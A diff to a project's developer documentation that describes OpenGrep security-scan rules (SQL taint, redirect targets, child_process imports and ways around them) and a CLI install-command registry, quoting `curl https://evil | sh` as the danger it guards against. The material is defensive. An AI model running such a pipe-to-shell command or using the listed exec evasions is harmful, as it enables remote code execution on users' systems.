@@ -45,7 +45,23 @@ Merging into `main` takes a PR with two green checks from `.github/workflows/ci.
 (`npm run gate`) and `sast`, an [OpenGrep](https://github.com/opengrep/opengrep) scan with the
 repo's own rules in `.opengrep/rules.yml` (request input in SQL text or a redirect target, shell
 exec, eval, gray-matter, hosted LLM endpoints, disabled TLS checks, weak hashes, `Math.random()`,
-cookies without `httpOnly`, raw HTML sinks). Run it locally with
+cookies without `httpOnly`, raw HTML sinks). OpenGrep 1.x taint does not follow a value into another
+function, so any function parameter reaching SQL text fails the scan too, directly or through a
+clause list it was `push()`ed or `unshift()`ed into and `join()`ed: prepare() on any handle and exec()
+on a `db` (RegExp#exec is not SQL), the `sql` of a `{sql, params}` fragment, built or assigned
+(`f.sql =` or `f['sql'] =`; `access.ts`, whose parameters are table aliases, is
+the one exception), and the text handed to a SQL-text helper (`count`, `touchFrom`, or a local arrow
+that prepares its first parameter; a new module-level helper is added to the rule by name), and so does any parameter but the Hono context `c` reaching a redirect target; request
+input read off `c` is a source wherever it is read (`c.req.*`, `c.req.raw`, or the `parseQuery` /
+`parseJson` helpers that read it in `lib/http.ts`). Shell exec is flagged where it is taken: a named
+import or re-export of `exec`/`execSync`, and the whole `child_process` module wherever it is bound (a
+namespace or default import, `export *`, a `require` or any other call taking the module name such as a
+`createRequire` result, a dynamic `import()`, `process.getBuiltinModule()`), so `promisify(exec)`,
+`let { exec } = cp`, `cp['exec']` or a barrel is no way around it; `import { execFile, spawn }` stays
+allowed. A module name built at run time is not seen. A parameter that carries SQL text by design is named `sql` or `...Sql`, a
+value goes into a fragment's `params` behind a `?` (an `access.ts`-style fragment composes others
+through their `.sql`), and a helper takes the Hono context as `c` and builds its redirect URL from a
+fixed origin. Run it locally with
 `opengrep test .opengrep && opengrep scan --config .opengrep/rules.yml --exclude .opengrep --error .`;
 a deliberate exception gets a `// nosemgrep: <rule id>` comment saying why it is safe.
 
@@ -276,7 +292,7 @@ A top-level `requires: [context-builder]` is accepted too, for skills that alrea
 
 The group page shows a **Requires** panel listing every CLI the group's effective members need (included groups too, at each member's pinned version), which items need it, and, for a CLI in the instance's tool registry, its install command per platform (macOS, Linux, Windows) with a copy button, an "install all" block (one command per line, so one failure does not hide the rest) and a one-liner that prints which binaries are missing. `GET /api/v1/groups/<slug>` returns the same list as `requires: [{name, items, tool: {homepage, check, install} | null, sources?}]`; the MCP `get_group` and `get_bundle` tools carry it too, so an agent can tell the user what to install first.
 
-Install commands come only from the registry, which admins keep on `/admin/settings` (CLI tools card; `GET`/`POST /api/v1/admin/cli-tools`, `PUT`/`DELETE /api/v1/admin/cli-tools/<name>`, 404 for everyone else, every change audited with its commands). An item never supplies one: a `metadata.install` field is ignored, because readers paste these commands into a terminal and any public group could otherwise show `curl https://evil | sh` under a friendly name. A CLI not in the registry is listed with no command, plus the GitHub repository the requiring item was imported from. SCP never runs any of these commands. The registry starts empty.
+Install commands come only from the registry, which admins keep on `/admin/settings` (CLI tools card; `GET`/`POST /api/v1/admin/cli-tools`, `PUT`/`DELETE /api/v1/admin/cli-tools/<name>`; 401 signed out and 403 to anyone but a full admin, like every admin route; every change audited with its commands). An item never supplies one: a `metadata.install` field is ignored, because readers paste these commands into a terminal and any public group could otherwise show `curl https://evil | sh` under a friendly name. A CLI not in the registry is listed with no command, plus the GitHub repository the requiring item was imported from. SCP never runs any of these commands. The registry starts empty.
 
 ### Tools
 
